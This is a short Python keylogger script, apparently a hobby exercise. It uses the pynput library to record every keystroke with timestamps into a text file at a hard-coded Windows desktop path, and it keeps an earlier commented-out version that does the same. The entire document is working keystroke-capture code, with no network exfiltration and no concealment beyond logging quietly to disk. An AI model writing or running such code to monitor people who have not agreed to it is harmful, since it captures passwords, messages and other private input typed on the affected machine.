#  Key-Logger Program

# from pynput.keyboard import Key, Listener

# k = []


# # print("Hey this is my Program")
# def on_press(key):
#     k.append(key)
#     write_1(k)
#     print(key)

# def write_1(var):
#     with open("C:\\Users\\yashg\\OneDrive\\Desktop\\CODE\\demo.txt","a") as f:
#         for i in var:
#             newVar = str(i).replace("'",'')
#             f.write(newVar)
#             f.write(" ")

# def on_release(key):
#     if key == Key.esc:
#         return False
# with Listener(on_press=on_press,on_release=on_release) as l:
#     l.join()

from pynput.keyboard import Key,Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+"C:\\Users\\yashg\\OneDrive\\Desktop\\CODE\\demo.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    print(l)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
